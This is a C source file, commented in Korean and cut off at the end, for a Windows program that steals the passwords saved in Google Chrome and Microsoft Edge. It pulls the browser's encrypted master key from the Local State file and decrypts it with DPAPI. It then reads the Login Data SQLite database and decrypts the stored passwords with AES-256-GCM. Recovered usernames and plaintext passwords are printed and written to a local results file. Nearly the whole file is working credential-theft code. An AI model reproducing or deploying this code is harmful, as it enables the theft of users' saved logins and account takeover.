#include <windows.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sqlite3.h" 

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "sqlite3.lib") 

//define LOCAL_STATE_PATH NULL
//#define LOGIN_DATA_PATH NULL
#define MAX_FILE_SIZE (1024 * 1024) 

#define CHROME_HEADER_SIZE 5        
#define AES_KEY_SIZE 32             
#define GCM_NONCE_SIZE 12           
#define GCM_TAG_SIZE_16 16          // Tag 16B 고정
#define ENCRYPTED_V10_HEADER 3      // v10 Header 3B

#ifndef min
#define min(a, b) (((a) < (b)) ? (a) : (b))
#endif


// 브라우저별 경로 정보를 담는 구조체
typedef struct {
    char* browser_name;
    char* local_state_path;
    char* login_data_path;
    char* id[50][256];
    char* password[50][256];
} BrowserConfig;

//BrowserConfig b_config[2];

// Chrome과 Edge의 기본 경로를 배열로 정의
// 사용자 이름은 실행 시점에 동적으로 대체되어야 함 (이 예시에서는 'user01' 고정)
BrowserConfig BROWSER_CONFIGS[] = {
    {
        "Google Chrome",
        "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
        "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
    },
    {
        "Microsoft Edge",
        "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State",
        "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
    }
};
const int NUM_BROWSERS = sizeof(BROWSER_CONFIGS) / sizeof(BROWSER_CONFIGS[0]);






void DumpBytes(const char* label, const BYTE* data, DWORD size) {
    printf("   - %s (%lu bytes): ", label, size);
    for (DWORD i = 0; i < size; i++) {
        printf("%02X", data[i]);
        if (i < size - 1 && (i + 1) % 16 == 0) {
            printf("\n%32s", ""); 
        }
    }
    printf("\n");
}


char* read_file_to_string(const char* filename, size_t* file_len_out) {
    FILE* fp; char* content; long len;
    fp = fopen(filename, "rb");

    if (fp == NULL) 
    { 
        perror("오류: Local State 파일을 열 수 없습니다. 경로를 확인하십시오"); 
        return NULL; 
    }

    fseek(fp, 0, SEEK_END); 
    len = ftell(fp); 
    fseek(fp, 0, SEEK_SET);

    if (len <= 0 || len > MAX_FILE_SIZE) 
    { 
        fprintf(stderr, "오류: 파일 크기가 유효하지 않습니다. (%ld)\n", len);
        fclose(fp); 
        return NULL; 
    }
    content = (char*)malloc(len + 1);

    if (content == NULL) 
    { 
        perror("오류: 메모리 할당 실패"); 
        fclose(fp); 
        return NULL; 
    }
    size_t read_len = fread(content, 1, len, fp);
    
    if (read_len != len) 
    { 
        fprintf(stderr, "오류: 파일 내용 읽기 실패."); 
        free(content); 
        fclose(fp); 
        return NULL; 
    }
    content[len] = '\0'; 
    *file_len_out = len; 
    fclose(fp); 
    return content;
}

// --- 키 추출 및 Base64 디코딩 함수 ---
HRESULT GetEncryptedKeyData(char* local_state_path, BYTE** encrypted_key_out, DWORD* size_out) {

    char userprofile[260];
    char tmp[260]="C:\\Users\\";


    GetEnvironmentVariableA("USERPROFILE", userprofile, sizeof(userprofile));
    snprintf(tmp, sizeof(tmp),
        "%s%s",userprofile, local_state_path );
    //printf("%s:", tmp);

    char* file_content = NULL; 
    size_t file_len = 0; 
    char* base64_key_string = NULL;
    BYTE* decoded_bytes = NULL; 
    HRESULT hr = E_FAIL;

    char* LOCAL_STATE_PATH = tmp;


    printf("1. Local State 파일 읽기...\n");
    file_content = read_file_to_string(LOCAL_STATE_PATH, &file_len); 
    if (!file_content) 
        return E_FAIL;

    const char* pattern = "\"encrypted_key\":\""; 
    char* base64_key_start = strstr(file_content, pattern);

    if (base64_key_start == NULL) 
    { 
        fprintf(stderr, "❌ 'encrypted_key' 패턴을 찾을 수 없습니다.\n"); 
        goto cleanup; 
    }
    base64_key_start += strlen(pattern); 
    char* base64_key_end = strchr(base64_key_start, '\"');

    if (base64_key_end == NULL) 
    { 
        fprintf(stderr, "❌ Base64 문자열 끝을 찾을 수 없습니다.\n"); 
        goto cleanup; 
    }

    size_t base64_len = base64_key_end - base64_key_start;
    base64_key_string = (char*)malloc(base64_len + 1);

    if (base64_key_string == NULL) 
    { 
        perror("오류: 메모리 할당 실패"); 
        goto cleanup; 
    }
    strncpy(base64_key_string, base64_key_start, base64_len); 
    base64_key_string[base64_len] = '\0';
    printf("2. Base64 키 문자열 추출 성공 (길이: %zu)\n", base64_len);
    DWORD decoded_size = 0;

    if (!CryptStringToBinaryA(base64_key_string, (DWORD)base64_len, CRYPT_STRING_BASE64, NULL, &decoded_size, NULL, NULL)) 
    { 
        goto cleanup; 
    }

    decoded_bytes = (BYTE*)malloc(decoded_size);
    if (decoded_bytes == NULL) 
    { 
        perror("오류: 메모리 할당 실패"); 
        goto cleanup; 
    }
    if (!CryptStringToBinaryA(base64_key_string, (DWORD)base64_len, CRYPT_STRING_BASE64, decoded_bytes, &decoded_size, NULL, NULL)) 
    { 
        goto cleanup; 
    }
    *encrypted_key_out = decoded_bytes; 
    *size_out = decoded_size; 
    hr = S_OK;
    printf("3. Base64 디코딩 성공 (크기: %lu)\n", decoded_size);
cleanup: 

    if (file_content) 
        free(file_content); 

    if (base64_key_string) 
        free(base64_key_string);

    if (FAILED(hr) && decoded_bytes) 
        free(decoded_bytes); 

    return hr;
}

// --- DPAPI 복호화 함수 ---
HRESULT DecryptDPAPIKey(const BYTE* encrypted_data, DWORD encrypted_size, BYTE** decrypted_data_out, DWORD* decrypted_size_out) {
    DATA_BLOB encrypted_blob = { 0 }; 
    DATA_BLOB decrypted_blob = { 0 }; 
    BOOL success; HRESULT hr = E_FAIL; 

    if (encrypted_size < CHROME_HEADER_SIZE) 
    { 
        return E_INVALIDARG; 
    }

    encrypted_blob.pbData = (PBYTE)encrypted_data + CHROME_HEADER_SIZE;
    encrypted_blob.cbData = encrypted_size - CHROME_HEADER_SIZE;
    printf("4. CryptUnprotectData를 호출하여 DPAPI 복호화 시도 (헤더 5바이트 제거 후 크기: %lu)...\n", encrypted_blob.cbData);
    success = CryptUnprotectData(&encrypted_blob, NULL, NULL, NULL, NULL, 0, &decrypted_blob);
    
    if (success) { 
        *decrypted_data_out = decrypted_blob.pbData; 
        *decrypted_size_out = decrypted_blob.cbData; 
        hr = S_OK; 
    } else { 
        DWORD dwError = GetLastError(); 
        fprintf(stderr, "❌ CryptUnprotectData 실패. 오류 코드: 0x%lX\n", dwError); 
        hr = HRESULT_FROM_WIN32(dwError); 
    }
    return hr;
}


// --- 🌟 AES-256-GCM 복호화 함수 (GCM 표준: AAD=NULL 적용) 🌟 ---
HRESULT DecryptAES256GCM(const BYTE* master_key, DWORD master_key_size,
    const BYTE* encrypted_data, DWORD encrypted_size,
    BYTE** plaintext_out, DWORD* plaintext_size_out)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    PBYTE pbKeyObject = NULL;
    DWORD cbKeyObject = 0;
    DWORD cbData = 0;
    NTSTATUS status;
    HRESULT hr = E_FAIL;
    
    // 구조 상수
    const DWORD CURRENT_TAG_SIZE = GCM_TAG_SIZE_16; 
    const DWORD aad_size = 0; // 🌟 AAD 크기 0 (NULL) 🌟
    
    if (master_key_size < AES_KEY_SIZE || encrypted_size < ENCRYPTED_V10_HEADER + GCM_NONCE_SIZE + CURRENT_TAG_SIZE) {
        fprintf(stderr, "❌ 입력 크기가 유효하지 않습니다. (최소 31바이트 필요)\n");
        return E_INVALIDARG;
    }

    // 데이터 분리 (Tag 크기 16B, IV Offset 3)
    const BYTE* iv_nonce = encrypted_data + ENCRYPTED_V10_HEADER;   // IV Offset 3
    const BYTE* tag = encrypted_data + encrypted_size - CURRENT_TAG_SIZE; // Tag 크기 16B
    const BYTE* ciphertext = iv_nonce + GCM_NONCE_SIZE;                      

    // 암호문 크기 계산 (41 - 3 - 12 - 16 = 10 bytes)
    DWORD ciphertext_size = encrypted_size - ENCRYPTED_V10_HEADER - GCM_NONCE_SIZE - CURRENT_TAG_SIZE;
    
    // 디버깅 출력 
    printf("   - 예상 Ciphertext 크기: %lu 바이트\n", ciphertext_size);
    printf("   - IV/Nonce 시작 Offset: %d\n", ENCRYPTED_V10_HEADER);
    printf("   - AAD 설정: NULL (0바이트) 🌟\n");
    DumpBytes("IV/Nonce (12B)", iv_nonce, GCM_NONCE_SIZE);
    DumpBytes("Tag (16B)", tag, CURRENT_TAG_SIZE); 
    DumpBytes("Ciphertext", ciphertext, ciphertext_size);

    if (ciphertext_size <= 0) {
        fprintf(stderr, "❌ 암호문 크기가 0이거나 유효하지 않습니다.\n");
        return E_INVALIDARG;
    }

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (status != 0) goto cleanup;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (status != 0) goto cleanup;

    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (status != 0) goto cleanup;

    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL) goto cleanup;

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, (PBYTE)master_key, AES_KEY_SIZE, 0);
    if (status != 0) goto cleanup;

    DWORD plaintext_len = ciphertext_size;
    *plaintext_out = (BYTE*)malloc(plaintext_len + 1);
    if (*plaintext_out == NULL) goto cleanup;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO AuthInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(AuthInfo);

    AuthInfo.pbNonce = (PBYTE)iv_nonce;
    AuthInfo.cbNonce = GCM_NONCE_SIZE;
    AuthInfo.pbTag = (PBYTE)tag;
    AuthInfo.cbTag = CURRENT_TAG_SIZE; // 16B 태그 크기 사용
    
    AuthInfo.pbAuthData = NULL;       // 🌟 AAD NULL 설정 🌟
    AuthInfo.cbAuthData = 0;          // AAD 크기 0 🌟

    status = BCryptDecrypt(
        hKey,
        (PBYTE)ciphertext,
        ciphertext_size,
        &AuthInfo, 
        NULL, 0,
        *plaintext_out,
        plaintext_len,
        &plaintext_len,
        0
    );

    if (status != 0) {
        fprintf(stderr, "❌ BCryptDecrypt 실패 (복호화 또는 인증 실패). Status: 0x%lX\n", status);
        free(*plaintext_out);
        *plaintext_out = NULL;
        goto cleanup;
    }

    (*plaintext_out)[plaintext_len] = '\0';
    *plaintext_size_out = plaintext_len;
    hr = S_OK;

cleanup: 
    if (hKey) BCryptDestroyKey(hKey);
    if (pbKeyObject) HeapFree(GetProcessHeap(), 0, pbKeyObject);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);

    return hr;
}


// --- SQLite 데이터베이스에서 암호화된 비밀번호 추출 함수 ---
HRESULT GetEncryptedPassword(int index, BrowserConfig* config,
                             BYTE** encrypted_password_out, 
                             DWORD* size_out) 
{

    sqlite3 *db = NULL; 
    sqlite3_stmt *stmt = NULL; 
    int rc; BYTE* buffer = NULL; 
    HRESULT hr = E_FAIL;
    

    char userprofile[260];
    char tmp[260] = "C:\\Users\\";

    GetEnvironmentVariableA("USERPROFILE", userprofile, sizeof(userprofile));
    snprintf(tmp, sizeof(tmp),
        "%s%s", userprofile, config->login_data_path);


    char* db_path = tmp;







    rc = sqlite3_open_v2(db_path, &db, SQLITE_OPEN_READONLY, NULL);



    if (rc != SQLITE_OK) 
    { 
        fprintf(stderr, "❌ SQLite DB를 열 수 없습니다. (브라우저가 열려있을 수 있습니다.): %s\n", sqlite3_errmsg(db)); 
        goto cleanup; 
    }

    printf("\n5. SQLite DB 연결 성공. 비밀번호 쿼리 중...\n");
    // 암호화된 비밀번호가 저장된 유일한 항목을 쿼리
    const char* sql = "SELECT origin_url, username_value, password_value FROM logins WHERE password_value IS NOT NULL AND password_value <> '' LIMIT 1";
    rc = sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
    if (rc != SQLITE_OK) 
    { 
        fprintf(stderr, "❌ SQL 준비 실패: %s\n", sqlite3_errmsg(db));
        goto cleanup; 
    }

    rc = sqlite3_step(stmt);
    if (rc == SQLITE_ROW) {
        printf("   - URL: %s\n", sqlite3_column_text(stmt, 0));
        printf("   - 사용자 이름: %s\n", sqlite3_column_text(stmt, 1));
        strcpy(config->id[index],sqlite3_column_text(stmt, 1));


        const BYTE* encrypted_data = (const BYTE*)sqlite3_column_blob(stmt, 2);
        DWORD encrypted_data_size = sqlite3_column_bytes(stmt, 2);
        printf("   - 암호문 크기 (password_value): %lu 바이트\n", encrypted_data_size);
        if (encrypted_data_size < ENCRYPTED_V10_HEADER + GCM_NONCE_SIZE + GCM_TAG_SIZE_16) {
            fprintf(stderr, "❌ 경고: 암호문 크기가 너무 작습니다. (%lu). 예상 최소 크기: 31\n", encrypted_data_size);
            hr = E_FAIL; goto cleanup;
        }
        buffer = (BYTE*)malloc(encrypted_data_size);
        if (buffer) { 
            memcpy(buffer, encrypted_data, encrypted_data_size); 
            *encrypted_password_out = buffer; 
            *size_out = encrypted_data_size; 
            hr = S_OK; 
        }
        else { perror("오류: 메모리 할당 실패"); }
    } else if (rc == SQLITE_DONE) { fprintf(stderr, "❌ 'logins' 테이블에 복호화할 항목이 없습니다.\n"); hr = S_FALSE; }
    else { fprintf(stderr, "❌ SQLite 쿼리 실행 실패: %s\n", sqlite3_errmsg(db)); }
cleanup: 
    if (stmt) sqlite3_finalize(stmt); if (db) sqlite3_close(db);
    if (FAILED(hr) && buffer) free(buffer); return hr;
}




// --- 메인 함수 ---
int main() {
    HRESULT hr = S_OK;
    FILE* fp = fopen("pw_result.txt", "a");
    //int size = sizeof(b_config) / sizeof(b_config[0]);
    //printf("%d\n", size);
    //printf("%d:\n",NUM_BROWSERS);
    for (int i = 0; i < NUM_BROWSERS; i++) {
        const BrowserConfig* config = &BROWSER_CONFIGS[i];
        printf("\n=== Chrome/Edge 비밀번호 복호화 로직 시작 (GCM 표준: AAD=NULL) ===\n");

        BYTE* encrypted_key = NULL;
        DWORD encrypted_size = 0;
        BYTE* decrypted_key = NULL;
        DWORD decrypted_size = 0;
        BYTE master_key_buffer[AES_KEY_SIZE];
        BYTE* encrypted_password = NULL;
        DWORD encrypted_password_size = 0;
        BYTE* plaintext = NULL;
        DWORD plaintext_size = 0;



        hr = GetEncryptedKeyData(config->local_state_path, &encrypted_key, &encrypted_size);
        if (FAILED(hr)) 
        { 
            if (encrypted_key) 
                free(encrypted_key); 
            return 1; 
        }

        printf("\n4. DPAPI 복호화 실행\n");
        hr = DecryptDPAPIKey(encrypted_key, encrypted_size, &decrypted_key, &decrypted_size);

        if (SUCCEEDED(hr)) {
            printf("\n🎉 DPAPI 복호화 성공! 마스터 키 획득.\n");
            if (decrypted_size >= AES_KEY_SIZE) {
                memcpy(master_key_buffer, decrypted_key, min(decrypted_size, AES_KEY_SIZE));
                LocalFree(decrypted_key); decrypted_key = NULL;
                printf("   🌟 AES-256 키 (32바이트) [Dump]: \n");
                DumpBytes("Master Key (32B)", master_key_buffer, AES_KEY_SIZE);

                hr = GetEncryptedPassword(i, config, &encrypted_password, &encrypted_password_size); //config->login_data_path
                ////사이트명도 추가 필요. 그리고 config[0]이거 수정해야함.ㄷ
                fprintf(fp, "%s : ",config[0].browser_name );
                fprintf(fp, "%s",config->id[i]);
                if (SUCCEEDED(hr)) {
                    printf("\n6. 암호화된 비밀번호 복호화 실행 (AES-256-GCM)...\n");
                    DumpBytes("전체 암호문 데이터", encrypted_password, encrypted_password_size);

                    hr = DecryptAES256GCM(
                        master_key_buffer, AES_KEY_SIZE, encrypted_password, encrypted_password_size, &plaintext, &plaintext_size
                    );

                    if (SUCCEEDED(hr)) {
                        printf("\n🎉🎉 최종 비밀번호 복호화 성공! 🎉🎉\n");
                        printf("   - 복호화된 비밀번호: **%s**\n", plaintext);
                        fprintf(fp,"/ %s  \n\n", plaintext);
                        //strcpy(config->password[i], plaintext);
                    }
                    else {
                        fprintf(stderr, "❌ 최종 비밀번호 복호화 실패. (HRESULT: 0x%lX)\n", hr);
                    }
                }
                else if (hr == S_FALSE) {
                    fprintf(stderr, "\n✅ DB 연결 성공, 하지만 복호화할 데이터가 없습니다.\n");
                }
                else {
                    fprintf(stderr, "\n❌ DB에서 암호화된 비밀번호 추출 실패. (HRESULT: 0x%lX)\n", hr);
                }
            }
            else {
                fprintf(stderr, "❌ DPAPI 복호화 결과 크기가 예상보다 작습니다.\n");
            }
            printf("config:%s\n",config);
        }
        else {
            fprintf(stderr, "\n❌ 마스터 키 복호화 실패. (HRESULT: 0x%lX)\n", hr);
        }
        
        //for (int i = 0; i < NUM_BROWSERS; i++) {
        //    printf("cite : %s\n", config[i].browser_name);
        //    for (int j = 0; j < 50; j++) {  // 
        //        if (config[i].id[j] != '\0') {
        //            printf("id : %s\n", config[i].id[j]);
         //           printf("password : %s\n", config[i].password[j]);
          //      }
          //  }



        //}

        if (encrypted_key) free(encrypted_key);
        if (encrypted_password) free(encrypted_pas